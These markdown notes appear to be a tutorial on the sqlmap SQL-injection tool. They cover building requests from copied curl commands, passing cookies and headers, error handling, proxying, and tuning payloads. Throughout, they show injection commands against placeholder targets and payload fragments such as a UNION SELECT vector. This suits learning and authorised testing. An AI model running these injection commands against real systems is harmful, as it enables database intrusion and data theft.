# Running SQLMap on an HTTP Request

## Curl Commands

One of the easiest ways to setup `sqlmap` against a target.
Open Chrome and utilize **Copy as cURL** feature from the within the Network (Monitor) panel inside the development tools in the browser.

Then just change the command from `curl` to `sqlmap`.

**Example:**

```sh
sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

## GET/POST Requests

For testing POST data, the `--data` option can be used as the following:

```sh
sqlmap 'https://example.com/' --data 'uid=1&name=test'
```

## Full HTTP Requests

Use `-r` option

```sh
sqlmap -r request.txt
```

## Custom SQLMap Requests

If we wanted to pass a cookie, we can either use:

```sh
sqlmap ... --cookie='PHPSESSID=ab1234123dafodus....'
```

The same can be done using `-H/--header` option

```sh
sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

We can apply the same to options like `--host`, `--referer`, and `-A/--user-agent`, which are used to specify the same HTTP headers' values.

We can also use the `--random-agent` option.

We can change the HTTP method using `--method` option

```sh
sqlmap -u www.target.com --data='id=1' --method PUT
```

---
# Handling SQLMap Errors

## Display Errors

Use `--parse-errors` to parse DBMS errors and display them as the program runs.

## Store the Traffic

The `-t` option stores the whole traffic content to an output file:

```sh
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```
## Verbose Output

```sh
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

This will print all errors.
## Using Proxy

Use `--proxy` to redirect traffic through a `MiTM` proxy or `BurpSuite`

---
# Attack Tuning

Every payload sent to the target consists of:

- vector (e.g., `UNION ALL SELECT 1,2,VERSION()`): central part of the payload, carrying the useful SQL code to be executed at the target.
- boundaries (e.g. `'<vector>-- -`): prefix and suffix formations, used for proper injection of the vector into the vulnerable SQL statement.

## Prefix/Suffix

There is a requirement for special prefix and suffix values in rare cases, not covered by the regular SQLMap run.  
For such runs, options `--prefix` and `--suffix` can be used as follows:

```sh
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

## Level/Risk

For such demands, the options `--level` and `--risk` should be used:

- The option `--level` (`1-5`, default `1`) extends both vectors and boundaries being used, based on their expectancy of success (i.e., the lower the expectancy, the higher the level).
- The option `--risk` (`1-3`, default `1`) extends the used vector set based on their risk of causing problems at the target side (i.e., risk of database entry loss or denial-of-service).

## Advanced Tuning
#### Status Codes

`--code=200`
#### Titles

`--title`

Can be used if the `<title>` of the page changes due to the condition
#### Strings

In specific cases, a specific string might appear due to some condition, we can use:

`--string=<Somestring>`
#### Text-only

If we are dealing with a lot of hidden content such us certain HTML pages that contains `<script>`, `<style>`, `<meta>`.
We can use `--text-only`.
#### Techniques

In special cases we might need to narrow down our payloads to certain types only, we can use the option:

`--technique`
#### UNION SQLi Tuning

We can assist SQLMap to find the right **UNION** payload by specifying more details.

- **`--union-cols`**: Use this option to tell SQLMap the exact number of columns the vulnerable query returns. This is helpful if you have already figured this out manually.
- **`--union-char`**: If the default `NULL` or random integer values used by SQLMap cause errors, you can use this to specify a different character or value (e.g., `'a'`) that is compatible with the query's data types.
- **`--union-from`**: Some databases, like Oracle, require a `FROM <table>` clause in `UNION` queries. This option lets you specify the required table, ensuring the injected query is valid.